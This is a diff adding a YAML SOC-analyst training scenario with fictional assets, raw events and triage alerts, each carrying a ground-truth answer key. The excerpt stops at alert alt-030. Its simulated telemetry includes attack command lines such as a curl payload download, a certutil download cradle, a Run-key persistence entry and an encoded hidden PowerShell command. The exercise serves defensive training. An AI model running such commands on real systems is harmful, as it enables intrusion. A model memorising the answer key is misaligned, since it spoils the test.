@@ -1,0 +1,1270 @@
+id: soc-l1-noisy-shift
+version: 1
+title: "L1 Shift: A Noisy Morning Shift at Apex Dynamics"
+level: L1
+estimatedMinutes: 45
+skillsTested:
+  - soc_alert_triage
+  - soc_phishing_analysis
+  - soc_network_traffic
+  - soc_windows_logs
+  - soc_linux_logs
+  - soc_malware_triage
+  - soc_threat_intel
+  - soc_case_management
+difficulty: intermediate
+briefing: |
+  Welcome to your Tier-1 analyst morning shift at Apex Dynamics Corp.
+  Overnight telemetry has produced 48 alerts across EDR, Network IDS, Authentication, Email Gateway, and Firewall sensors.
+  Your objective:
+  1. Triage alerts systematically. Isolate true security incidents from benign background activity and false positives.
+  2. For every alert, designate an accurate disposition and provide defensible triage reasoning.
+  3. Escalate confirmed threats to Tier 2 or Incident Response, and group correlated alerts into investigation cases.
+  4. Avoid over-escalating benign activity or false alarms.
+
+environment:
+  assets:
+    - id: ast-001
+      hostname: ws-fin-04.corp.internal
+      ip: 10.10.4.14
+      role: Workstation
+      os: Windows 11 Enterprise
+      criticality: HIGH
+      owner: jdoe
+      zone: zone-workstations
+      tags: [finance, accounting]
+    - id: ast-002
+      hostname: ws-eng-09.corp.internal
+      ip: 10.10.9.22
+      role: Workstation
+      os: Windows 11 Enterprise
+      criticality: MEDIUM
+      owner: asmith
+      zone: zone-workstations
+      tags: [engineering]
+    - id: ast-003
+      hostname: srv-stage-01.corp.internal
+      ip: 10.20.1.50
+      role: Staging Application Server
+      os: Ubuntu 24.04 LTS
+      criticality: MEDIUM
+      owner: devops-team
+      zone: zone-dmz
+      tags: [staging, web, external-facing]
+    - id: ast-004
+      hostname: srv-prod-db-01.corp.internal
+      ip: 10.30.2.10
+      role: Production Database
+      os: RHEL 9.3
+      criticality: CRITICAL
+      owner: dba-team
+      zone: zone-databases
+      tags: [crown-jewel, production]
+    - id: ast-005
+      hostname: dc-01.corp.internal
+      ip: 10.10.0.10
+      role: Active Directory Domain Controller
+      os: Windows Server 2022
+      criticality: CRITICAL
+      owner: it-admin
+      zone: zone-core
+      tags: [infrastructure, crown-jewel]
+    - id: ast-006
+      hostname: srv-mail-01.corp.internal
+      ip: 10.20.2.15
+      role: Secure Email Gateway
+      os: Hardened Linux
+      criticality: HIGH
+      owner: sec-ops
+      zone: zone-dmz
+      tags: [mail, perimeter]
+
+  users:
+    - id: usr-001
+      username: jdoe
+      email: jdoe@apex.corp.internal
+      displayName: "Jane Doe"
+      department: Finance
+      role: "Senior Accountant"
+      riskScore: 25
+    - id: usr-002
+      username: asmith
+      email: asmith@apex.corp.internal
+      displayName: "Alex Smith"
+      department: Engineering
+      role: "Software Developer"
+      riskScore: 10
+    - id: usr-003
+      username: rpatel
+      email: rpatel@apex.corp.internal
+      displayName: "Raj Patel"
+      department: IT Operations
+      role: "Systems Administrator"
+      riskScore: 15
+    - id: usr-004
+      username: mchen
+      email: mchen@apex.corp.internal
+      displayName: "Marcus Chen"
+      department: Marketing
+      role: "Campaign Specialist"
+      riskScore: 5
+    - id: usr-005
+      username: svc-backup
+      email: svc-backup@apex.corp.internal
+      displayName: "Service Account - Nightly Backups"
+      department: Infrastructure
+      role: "Service Principal"
+      riskScore: 0
+
+  networkZones:
+    - id: zone-workstations
+      name: Corporate Workstations
+      cidr: 10.10.0.0/16
+      description: End-user workstations and client laptops
+    - id: zone-dmz
+      name: Perimeter DMZ
+      cidr: 10.20.0.0/16
+      description: External-facing application servers and gateways
+    - id: zone-databases
+      name: Core Databases
+      cidr: 10.30.0.0/16
+      description: Isolated production database clusters
+    - id: zone-core
+      name: Core Infrastructure
+      cidr: 10.10.0.0/24
+      description: Domain controllers, DNS, and internal PKI
+
+rawEvents:
+  - id: evt-101
+    timestamp: "2026-10-12T08:14:22Z"
+    source: "EmailGateway"
+    action: "email_delivered"
+    message: "Inbound message from billing-update@invoice-secure.example delivered to jdoe@apex.corp.internal"
+    fields:
+      subject: "Urgent: Revised Q3 Vendor Remittance Details"
+      sender: "billing-update@invoice-secure.example"
+      recipient: "jdoe@apex.corp.internal"
+      attachment_count: 0
+      extracted_urls: "https://portal.invoice-secure.example/auth/login"
+
+  - id: evt-102
+    timestamp: "2026-10-12T08:16:05Z"
+    source: "EDR"
+    action: "browser_navigation"
+    message: "chrome.exe process on ws-fin-04 opened external URL"
+    fields:
+      process: "chrome.exe"
+      user: "jdoe"
+      destination_url: "https://portal.invoice-secure.example/auth/login"
+      destination_ip: "198.51.100.44"
+
+  - id: evt-103
+    timestamp: "2026-10-12T08:22:18Z"
+    source: "Authentication"
+    action: "user_login"
+    message: "Successful authentication for jdoe via Web SSO from untrusted IP"
+    fields:
+      user: "jdoe"
+      source_ip: "198.51.100.44"
+      auth_protocol: "SAML2.0"
+      mfa_status: "bypassed_cookie_replay"
+      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) HeadlessChrome"
+
+  - id: evt-104
+    timestamp: "2026-10-12T08:25:40Z"
+    source: "CloudAudit"
+    action: "mail_rule_created"
+    message: "User jdoe created mailbox forwarding rule to external recipient"
+    fields:
+      mailbox: "jdoe@apex.corp.internal"
+      rule_name: "Auto-Archive Invoices"
+      forward_to: "exfil-drop@external-audit.example"
+      condition: "subject_contains_invoice_or_wire"
+
+  - id: evt-105
+    timestamp: "2026-10-12T08:31:10Z"
+    source: "NetworkIDS"
+    action: "signature_match"
+    message: "ET SCAN Potential SSH Brute Force Observed"
+    fields:
+      src_ip: "203.0.113.88"
+      dst_ip: "10.20.1.50"
+      dst_port: 22
+      attempt_rate: "42 pkts/sec"
+
+  - id: evt-106
+    timestamp: "2026-10-12T08:35:45Z"
+    source: "Authentication"
+    action: "sshd_login_success"
+    message: "Accepted password for staging_deploy from 203.0.113.88 port 48212 ssh2"
+    fields:
+      host: "srv-stage-01.corp.internal"
+      user: "staging_deploy"
+      src_ip: "203.0.113.88"
+      auth_method: "password"
+
+  - id: evt-107
+    timestamp: "2026-10-12T08:38:00Z"
+    source: "EDR"
+    action: "process_creation"
+    message: "curl command spawned by sshd child shell downloading shell script"
+    fields:
+      host: "srv-stage-01.corp.internal"
+      parent_process: "bash"
+      command_line: "curl -s http://203.0.113.88:8080/stage2.sh -o /tmp/.x11-conf"
+      user: "staging_deploy"
+
+  - id: evt-108
+    timestamp: "2026-10-12T09:05:12Z"
+    source: "EDR"
+    action: "process_creation"
+    message: "certutil.exe invoked with urlcache download flags"
+    fields:
+      host: "ws-eng-09.corp.internal"
+      command_line: "certutil.exe -urlcache -split -f http://192.0.2.199/payload.bin C:\\Users\\Public\\update.exe"
+      user: "asmith"
+      parent_process: "cmd.exe"
+
+  - id: evt-109
+    timestamp: "2026-10-12T09:08:44Z"
+    source: "EDR"
+    action: "registry_modification"
+    message: "Registry Run key added for persistence"
+    fields:
+      host: "ws-eng-09.corp.internal"
+      target_key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      value_name: "ApexTelemetryAgent"
+      value_data: "C:\\Users\\Public\\update.exe"
+
+alerts:
+  # =========================================================================
+  # INCIDENT 1: Phishing to Account Takeover (jdoe / ws-fin-04)
+  # =========================================================================
+  - id: alt-001
+    timestamp: "2026-10-12T08:14:25Z"
+    source: "Email Gateway"
+    ruleName: "SUSPICIOUS_OUTBOUND_LINK_CLICK"
+    severity: "MEDIUM"
+    summary: "User jdoe clicked an unclassified external link in message from billing-update@invoice-secure.example"
+    relatedAsset: "ws-fin-04.corp.internal"
+    relatedUser: "jdoe"
+    relatedIocs:
+      - type: "domain"
+        value: "portal.invoice-secure.example"
+      - type: "email"
+        value: "billing-update@invoice-secure.example"
+    linkedRawEvents: ["evt-101", "evt-102"]
+    rawFields:
+      sender: "billing-update@invoice-secure.example"
+      link: "https://portal.invoice-secure.example/auth/login"
+      destination_ip: "198.51.100.44"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-phish-cred"
+      debrief: "True Positive. User jdoe received a targeted phishing lure mimicking vendor invoice updates and navigated to credential harvest portal."
+
+  - id: alt-002
+    timestamp: "2026-10-12T08:22:20Z"
+    source: "Authentication"
+    ruleName: "ANOMALOUS_GEOLOCATION_LOGIN"
+    severity: "HIGH"
+    summary: "Single Sign-On authentication for jdoe originating from unknown external IP 198.51.100.44 without hardware MFA"
+    relatedAsset: "ws-fin-04.corp.internal"
+    relatedUser: "jdoe"
+    relatedIocs:
+      - type: "ip"
+        value: "198.51.100.44"
+    linkedRawEvents: ["evt-103"]
+    rawFields:
+      auth_result: "SUCCESS"
+      client_ip: "198.51.100.44"
+      auth_method: "password_cookie"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-phish-cred"
+      debrief: "True Positive. Attacker replayed phished session credentials from external IP 198.51.100.44 minutes after link click."
+
+  - id: alt-003
+    timestamp: "2026-10-12T08:25:45Z"
+    source: "Cloud Audit"
+    ruleName: "SUSPICIOUS_INBOX_FORWARDING_RULE"
+    severity: "HIGH"
+    summary: "Mailbox forwarding rule configured on jdoe directing financial messages to external recipient"
+    relatedAsset: "ws-fin-04.corp.internal"
+    relatedUser: "jdoe"
+    relatedIocs:
+      - type: "email"
+        value: "exfil-drop@external-audit.example"
+    linkedRawEvents: ["evt-104"]
+    rawFields:
+      action: "New-InboxRule"
+      forward_address: "exfil-drop@external-audit.example"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-phish-cred"
+      debrief: "True Positive. Unauthorized email exfiltration rule configured immediately following external account access."
+
+  - id: alt-004
+    timestamp: "2026-10-12T08:27:10Z"
+    source: "EDR"
+    ruleName: "LSASS_MEMORY_ACCESS_BLOCKED"
+    severity: "CRITICAL"
+    summary: "Local security authority subsystem memory handle requested by unverified process on ws-fin-04"
+    relatedAsset: "ws-fin-04.corp.internal"
+    relatedUser: "jdoe"
+    linkedRawEvents: []
+    rawFields:
+      process_name: "svchost_check.exe"
+      target: "lsass.exe"
+      access_mask: "0x1010"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-phish-cred"
+      debrief: "True Positive. Compromised endpoint attempted credential dumping against LSASS."
+
+  # =========================================================================
+  # INCIDENT 2: SSH Brute Force and Compromise on Staging Server
+  # =========================================================================
+  - id: alt-005
+    timestamp: "2026-10-12T08:31:15Z"
+    source: "Network IDS"
+    ruleName: "INBOUND_SSH_BRUTE_FORCE_DETECTED"
+    severity: "HIGH"
+    summary: "High volume of failed SSH handshakes from external source 203.0.113.88 targeting srv-stage-01"
+    relatedAsset: "srv-stage-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "203.0.113.88"
+    linkedRawEvents: ["evt-105"]
+    rawFields:
+      connection_count: 382
+      dst_port: 22
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "tier2"
+      incidentId: "inc-ssh-bruteforce"
+      debrief: "True Positive. Automated password spraying / brute-force attack originating from external IP 203.0.113.88."
+
+  - id: alt-006
+    timestamp: "2026-10-12T08:35:50Z"
+    source: "Authentication"
+    ruleName: "SSH_LOGIN_AFTER_MULTIPLE_FAILURES"
+    severity: "CRITICAL"
+    summary: "Successful SSH authentication for staging_deploy after 300+ failures from 203.0.113.88"
+    relatedAsset: "srv-stage-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "203.0.113.88"
+    linkedRawEvents: ["evt-106"]
+    rawFields:
+      user: "staging_deploy"
+      client_ip: "203.0.113.88"
+      auth_type: "password"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-ssh-bruteforce"
+      debrief: "True Positive. Attacker successfully guessed the password for staging_deploy on the DMZ staging host."
+
+  - id: alt-007
+    timestamp: "2026-10-12T08:38:05Z"
+    source: "EDR"
+    ruleName: "SUSPICIOUS_CURL_SCRIPT_DOWNLOAD"
+    severity: "HIGH"
+    summary: "Interactive shell on srv-stage-01 spawned curl writing executable script into /tmp directory"
+    relatedAsset: "srv-stage-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "203.0.113.88"
+    linkedRawEvents: ["evt-107"]
+    rawFields:
+      command: "curl -s http://203.0.113.88:8080/stage2.sh -o /tmp/.x11-conf"
+      user: "staging_deploy"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-ssh-bruteforce"
+      debrief: "True Positive. Post-exploitation payload retrieval observed via curl following SSH breach."
+
+  - id: alt-008
+    timestamp: "2026-10-12T08:39:10Z"
+    source: "EDR"
+    ruleName: "REVERSE_SHELL_ESTABLISHED"
+    severity: "CRITICAL"
+    summary: "Outbound socket connection from /tmp/.x11-conf to 203.0.113.88:4444"
+    relatedAsset: "srv-stage-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "203.0.113.88"
+    linkedRawEvents: []
+    rawFields:
+      binary: "/tmp/.x11-conf"
+      remote_port: 4444
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "CRITICAL"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-ssh-bruteforce"
+      debrief: "True Positive. Active interactive reverse shell connection established back to attacker C2."
+
+  # =========================================================================
+  # INCIDENT 3: LOLBin Execution & Persistence (asmith / ws-eng-09)
+  # =========================================================================
+  - id: alt-009
+    timestamp: "2026-10-12T09:05:15Z"
+    source: "EDR"
+    ruleName: "CERTUTIL_DOWNLOAD_CRADLE"
+    severity: "HIGH"
+    summary: "certutil.exe executed with -urlcache parameters downloading binary from untrusted external IP 192.0.2.199"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    relatedIocs:
+      - type: "ip"
+        value: "192.0.2.199"
+      - type: "url"
+        value: "http://192.0.2.199/payload.bin"
+    linkedRawEvents: ["evt-108"]
+    rawFields:
+      process: "certutil.exe"
+      command: "certutil.exe -urlcache -split -f http://192.0.2.199/payload.bin C:\\Users\\Public\\update.exe"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-lolbin-exec"
+      debrief: "True Positive. Abuse of trusted Windows binary certutil.exe (T1105) to pull unverified binary payload."
+
+  - id: alt-010
+    timestamp: "2026-10-12T09:08:50Z"
+    source: "EDR"
+    ruleName: "REGISTRY_RUN_KEY_PERSISTENCE"
+    severity: "HIGH"
+    summary: "Non-standard executable added to HKCU Run key for user asmith on ws-eng-09"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    linkedRawEvents: ["evt-109"]
+    rawFields:
+      key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      payload: "C:\\Users\\Public\\update.exe"
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-lolbin-exec"
+      debrief: "True Positive. Persistence established via Registry Run key (T1547.001) pointing to dropped payload."
+
+  - id: alt-011
+    timestamp: "2026-10-12T09:11:02Z"
+    source: "EDR"
+    ruleName: "POWERSHELL_BASE64_ENCODED_COMMAND"
+    severity: "HIGH"
+    summary: "powershell.exe executed with -EncodedCommand parameter from C:\\Users\\Public"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    linkedRawEvents: []
+    rawFields:
+      process: "powershell.exe"
+      arguments: "-nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-lolbin-exec"
+      debrief: "True Positive. Obfuscated PowerShell execution for discovery / internal reconnaissance."
+
+  - id: alt-012
+    timestamp: "2026-10-12T09:12:30Z"
+    source: "Network IDS"
+    ruleName: "SUSPICIOUS_OUTBOUND_BEACON_INTERVAL"
+    severity: "MEDIUM"
+    summary: "Regular 30-second interval beaconing detected from 10.10.9.22 to 192.0.2.199"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "192.0.2.199"
+    linkedRawEvents: []
+    rawFields:
+      jitter: "2.1%"
+      interval_seconds: 30
+      bytes_sent: 1420
+    groundTruth:
+      kind: "true_positive"
+      correctDisposition: "true_positive"
+      correctSeverity: "HIGH"
+      correctEscalation: true
+      targetTier: "incident_response"
+      incidentId: "inc-lolbin-exec"
+      debrief: "True Positive. Fixed-interval C2 command beaconing observed following LOLBin execution."
+
+  # =========================================================================
+  # DUPLICATE / RELATED ALERT CLUSTERS (2 clusters)
+  # =========================================================================
+  - id: alt-013
+    timestamp: "2026-10-12T08:31:18Z"
+    source: "Firewall"
+    ruleName: "FW_PORT_22_CONN_THRESHOLD_EXCEEDED"
+    severity: "LOW"
+    summary: "Firewall session threshold exceeded for traffic from 203.0.113.88 to srv-stage-01"
+    relatedAsset: "srv-stage-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "203.0.113.88"
+    linkedRawEvents: ["evt-105"]
+    rawFields:
+      action: "DROP"
+      policy: "DMZ-SSH-INSPECT"
+    groundTruth:
+      kind: "duplicate"
+      correctDisposition: "duplicate"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      incidentId: "inc-ssh-bruteforce"
+      debrief: "Duplicate/Related. Secondary firewall threshold log corresponding directly to SSH brute-force alert alt-005."
+
+  - id: alt-014
+    timestamp: "2026-10-12T09:05:18Z"
+    source: "Firewall"
+    ruleName: "FW_UNUSUAL_EXTERNAL_HTTP_OUTBOUND"
+    severity: "LOW"
+    summary: "Direct outbound HTTP request to external IP 192.0.2.199 from ws-eng-09 on port 80"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    relatedIocs:
+      - type: "ip"
+        value: "192.0.2.199"
+    linkedRawEvents: ["evt-108"]
+    rawFields:
+      proto: "TCP"
+      dst_port: 80
+    groundTruth:
+      kind: "duplicate"
+      correctDisposition: "duplicate"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      incidentId: "inc-lolbin-exec"
+      debrief: "Duplicate/Related. Firewall connection telemetry mirroring certutil download alert alt-009."
+
+  # =========================================================================
+  # GENUINELY AMBIGUOUS ALERTS (3 alerts with acceptable alternatives)
+  # =========================================================================
+  - id: alt-015
+    timestamp: "2026-10-12T07:45:10Z"
+    source: "Network IDS"
+    ruleName: "RAPID_PORT_SCAN_DATABASE_SUBNET"
+    severity: "HIGH"
+    summary: "Sequential TCP SYN sweep across ports 1433, 1521, 5432 targeting srv-prod-db-01 from internal host 10.10.0.50"
+    relatedAsset: "srv-prod-db-01.corp.internal"
+    relatedIocs:
+      - type: "ip"
+        value: "10.10.0.50"
+    linkedRawEvents: []
+    rawFields:
+      ports_probed: "1433,1521,3306,5432"
+      source_host: "sec-scanner-01.corp.internal"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      acceptableAlternatives:
+        - disposition: "false_positive"
+          reason: "Analyst viewed signature as false alarm given authorized vulnerability scanner hostname."
+          scoreMultiplier: 1.0
+        - disposition: "needs_more_info"
+          reason: "Analyst requested change ticket verification to confirm scan window."
+          scoreMultiplier: 0.9
+      debrief: "Benign True Positive. Scheduled vulnerability scan originating from approved internal scanner sec-scanner-01."
+
+  - id: alt-016
+    timestamp: "2026-10-12T07:55:00Z"
+    source: "EDR"
+    ruleName: "POWERSHELL_NETWORK_ENUMERATION_SCRIPT"
+    severity: "MEDIUM"
+    summary: "Script execution invoking Get-NetIPConfiguration and Test-NetConnection by rpatel on dc-01"
+    relatedAsset: "dc-01.corp.internal"
+    relatedUser: "rpatel"
+    linkedRawEvents: []
+    rawFields:
+      user: "rpatel"
+      script_path: "C:\\AdminScripts\\network_health_check.ps1"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      acceptableAlternatives:
+        - disposition: "false_positive"
+          reason: "Standard administrative maintenance routine."
+          scoreMultiplier: 1.0
+        - disposition: "needs_more_info"
+          reason: "Checking with rpatel if routine script ran as expected."
+          scoreMultiplier: 0.85
+      debrief: "Benign True Positive. Authorized routine health check script executed by Domain Administrator rpatel."
+
+  - id: alt-017
+    timestamp: "2026-10-12T08:10:04Z"
+    source: "Email Gateway"
+    ruleName: "EXTERNAL_EMAIL_TRACKING_PIXEL_SUSPECT"
+    severity: "LOW"
+    summary: "Inbound newsletter from promo@marketing-insights.example contained zero-byte tracking image beacon"
+    relatedUser: "mchen"
+    relatedIocs:
+      - type: "domain"
+        value: "marketing-insights.example"
+    linkedRawEvents: []
+    rawFields:
+      subject: "Weekly B2B Cyber Trends Roundup"
+      sender: "promo@marketing-insights.example"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      acceptableAlternatives:
+        - disposition: "benign_true_positive"
+          reason: "Benign commercial email tracking pixel matching generic beacon rule."
+          scoreMultiplier: 1.0
+        - disposition: "needs_more_info"
+          reason: "Requested sender reputation confirmation."
+          scoreMultiplier: 0.8
+      debrief: "False Positive. Legitimate industry newsletter with standard marketing tracking pixel triggered heuristic beacon detection."
+
+  # =========================================================================
+  # BENIGN ENTERPRISE NOISE & FALSE POSITIVES (alerts 018 to 048)
+  # =========================================================================
+  - id: alt-018
+    timestamp: "2026-10-12T06:30:11Z"
+    source: "Authentication"
+    ruleName: "BATCH_SERVICE_LOGON_SPIKE"
+    severity: "LOW"
+    summary: "Automated service account svc-backup authenticated 45 times in 60 seconds against file shares"
+    relatedAsset: "dc-01.corp.internal"
+    relatedUser: "svc-backup"
+    linkedRawEvents: []
+    rawFields:
+      logon_type: 4
+      user: "svc-backup"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Nightly backup service principal performing scheduled incremental data archive."
+
+  - id: alt-019
+    timestamp: "2026-10-12T06:45:00Z"
+    source: "EDR"
+    ruleName: "NEW_EXECUTABLE_SPAWNED_IN_TEMP"
+    severity: "MEDIUM"
+    summary: "Visual Studio Code updater launched code_installer.exe in AppData/Local/Temp on ws-eng-09"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    linkedRawEvents: []
+    rawFields:
+      process: "code_installer.exe"
+      signer: "Microsoft Corporation"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      debrief: "False Positive. Legitimate digitally signed IDE automatic software update."
+
+  - id: alt-020
+    timestamp: "2026-10-12T07:02:18Z"
+    source: "Firewall"
+    ruleName: "NTP_TRAFFIC_OUTBOUND_UNAPPROVED_IP"
+    severity: "LOW"
+    summary: "NTP UDP packet outbound to pool.ntp.example from ws-fin-04"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      dst_port: 123
+      protocol: "UDP"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Standard workstation clock drift synchronization request."
+
+  - id: alt-021
+    timestamp: "2026-10-12T07:15:33Z"
+    source: "Network IDS"
+    ruleName: "DNS_QUERY_LONG_SUBDOMAIN"
+    severity: "LOW"
+    summary: "Suspiciously long DNS query string resolved by ws-eng-09: telemetry-v2.cdn.example"
+    relatedAsset: "ws-eng-09.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      query: "telemetry-v2.cdn.example"
+      length: 24
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Legitimate developer CDN dependency lookup triggered length threshold."
+
+  - id: alt-022
+    timestamp: "2026-10-12T07:22:45Z"
+    source: "EDR"
+    ruleName: "SUSPICIOUS_WHOAMI_EXECUTION"
+    severity: "LOW"
+    summary: "whoami command executed by administrator rpatel in PowerShell on dc-01"
+    relatedAsset: "dc-01.corp.internal"
+    relatedUser: "rpatel"
+    linkedRawEvents: []
+    rawFields:
+      process: "whoami.exe"
+      command: "whoami /groups"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. IT Administrator manually verifying user group membership permissions."
+
+  - id: alt-023
+    timestamp: "2026-10-12T07:35:12Z"
+    source: "Authentication"
+    ruleName: "FAILED_LOGIN_BAD_PASSWORD_THRESHOLD"
+    severity: "LOW"
+    summary: "User mchen failed password validation 3 times on workstation before successful login"
+    relatedUser: "mchen"
+    linkedRawEvents: []
+    rawFields:
+      substatus: "STATUS_WRONG_PASSWORD"
+      success_on_attempt: 4
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Standard user password mistype resolved upon fourth attempt."
+
+  - id: alt-024
+    timestamp: "2026-10-12T07:50:40Z"
+    source: "Email Gateway"
+    ruleName: "EMAIL_ATTACHMENT_MACRO_DETECTED"
+    severity: "MEDIUM"
+    summary: "Inbound email to jdoe contained password-protected ZIP archive"
+    relatedAsset: "ws-fin-04.corp.internal"
+    relatedUser: "jdoe"
+    linkedRawEvents: []
+    rawFields:
+      sender: "quarterly-report@partner.example"
+      attachment: "Q3_Summary.zip"
+      action: "QUARANTINED"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      debrief: "False Positive. Standard automated gateway quarantine of encrypted partner attachment; no execution occurred."
+
+  - id: alt-025
+    timestamp: "2026-10-12T08:00:22Z"
+    source: "Network IDS"
+    ruleName: "TLS_CERTIFICATE_EXPIRED_OBSERVED"
+    severity: "LOW"
+    summary: "Expired SSL/TLS certificate negotiated with internal staging proxy"
+    relatedAsset: "srv-stage-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      issuer: "Apex Internal CA"
+      days_expired: 2
+    groundTruth:
+      kind: "informational"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Informational/False Positive. Internal staging certificate hygiene issue, not an active compromise."
+
+  - id: alt-026
+    timestamp: "2026-10-12T08:05:14Z"
+    source: "EDR"
+    ruleName: "CRON_JOB_MODIFIED"
+    severity: "LOW"
+    summary: "Hourly logrotate cron schedule modified on srv-stage-01"
+    relatedAsset: "srv-stage-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      file: "/etc/cron.hourly/logrotate"
+      user: "root"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Scheduled package maintenance updating logrotate configuration."
+
+  - id: alt-027
+    timestamp: "2026-10-12T08:12:05Z"
+    source: "Firewall"
+    ruleName: "DENIED_INBOUND_RDP_EXTERNAL"
+    severity: "LOW"
+    summary: "Firewall dropped external connection attempt to port 3389 on srv-stage-01"
+    relatedAsset: "srv-stage-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      src_ip: "198.51.100.12"
+      action: "DROP"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Routine internet background scanning dropped effectively by perimeter firewall."
+
+  - id: alt-028
+    timestamp: "2026-10-12T08:15:30Z"
+    source: "Authentication"
+    ruleName: "KERBEROS_PREAUTH_FAILED"
+    severity: "LOW"
+    summary: "Event ID 4771 Kerberos pre-authentication failure for workstation ws-fin-04"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      error_code: "0x18"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Expired machine password token refreshed automatically by Active Directory."
+
+  - id: alt-029
+    timestamp: "2026-10-12T08:19:10Z"
+    source: "EDR"
+    ruleName: "POWERSHELL_EXECUTION_POLICY_BYPASS"
+    severity: "MEDIUM"
+    summary: "PowerShell spawned with -ExecutionPolicy Bypass by internal SCCM agent"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      parent_process: "CcmExec.exe"
+      command: "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\Inventory.ps1"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Approved enterprise systems management agent (SCCM) running software inventory."
+
+  - id: alt-030
+    timestamp: "2026-10-12T08:24:00Z"
+    source: "Network IDS"
+    ruleName: "ICMP_LARGE_PACKET_BURST"
+    severity: "LOW"
